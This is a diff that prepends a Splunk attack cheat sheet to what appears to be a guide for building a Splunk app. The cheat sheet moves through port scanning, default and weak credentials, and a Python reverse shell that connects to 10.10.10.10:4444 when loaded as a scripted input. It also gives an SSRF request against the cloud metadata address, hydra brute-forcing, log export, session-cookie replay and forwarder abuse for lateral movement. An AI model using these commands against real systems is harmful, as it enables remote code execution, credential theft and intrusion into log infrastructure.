@@ -1,5 +1,74 @@
+# 1. Discovery/Footprinting
+## 1.1 Nmap Port Scan
+sudo nmap -sV <target_ip> -p 8000,8089
+Identify Splunkd httpd (port 8000/8089).
+## 1.2 Web Interface Access
+```
+http://<target_ip>:8000
+Default credentials (older versions): admin:changeme
+Common weak passwords: admin, Welcome, Password123
+Check for Splunk Free (no authentication).
+```
+## 1.3 Version Detection
+Check web interface headers, or API responses.
+# 2. Enumeration
+## 2.1 Splunk Free Check
+No login prompt = possible Splunk Free.
+## 2.2 Web Interface Exploration
+Data browsing, reports, dashboards.
+Installed Splunkbase applications.
+## 2.3 Scripted Inputs (RCE)
+Create inputs for Bash, PowerShell, Python.
+Python reverse shell example (scripted input):
+```
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
+```
+## 2.4 REST API (Port 8089)
+Enumerate for vulnerabilities.
+Use tools like curl or Python requests.
+Example REST API Enumeration:
+```
+curl -k -u admin:changeme https://<target_ip>:8089/services/server/info
+```
+## 2.5 Vulnerability Scanning
+Use vulnerability scanners (e.g., Nessus, OpenVAS).
+Search CVE databases (NVD, Exploit-DB).
+## 2.6 SSRF
+Test for SSRF vulnerabilities.
+Example SSRF Exploitation:
+```
+curl -k -X POST -H "Content-Type: application/x-www-form-urlencoded" \
+-d "splunk_server=127.0.0.1&remote_server=http://169.254.169.254/latest/meta-data/" \
+https://<target_ip>:8089/en-US/splunkd/__raw/services/data/inputs/http
+```
+## 2.7 Credential Brute-forcing
+Attempt brute forcing Splunk credentials.
+Example using hydra:
+```
+hydra -L users.txt -P passwords.txt <target_ip> http-form-post "/en-US/account/login:username=^USER^&password=^PASS^:Invalid username or password"
+```
+## 2.8 Splunk Log Extraction (if accessible)
+curl -k -u admin:changeme https://<target_ip>:8089/services/search/jobs/export -d search="search index=_internal | head 10"
+## 2.9 Session Hijacking (If Cookies Leak)
+Capture Splunk session cookies via XSS or MITM.
+Use curl or browser to replay requests:
+curl -k -b "splunkd_8000=<session_cookie>" https://<target_ip>:8000/en-US/
+## 2.10 Splunk Forwarder Abuse
+If compromised, use forwarders to send logs elsewhere or execute scripts.
+Modify inputs.conf to insert a reverse shell payload.
+## 3. Key Points
+- Splunk often runs as root/SYSTEM.
+- Compromise = access to sensitive logs & network data.
+- Scripted inputs = direct RCE.
+- REST API = powerful attack vector.
+- Splunk logs can contain credentials.
+- Splunk logs can contain network information.
+- Session cookies can be hijacked for persistence.
+- Splunk forwarders can be abused for lateral movement.
 
-## 1. Create Splunk App Directory Structure
+
+
+## 2. Create Splunk App Directory Structure
 
 Create the necessary directory structure for the Splunk application:
 
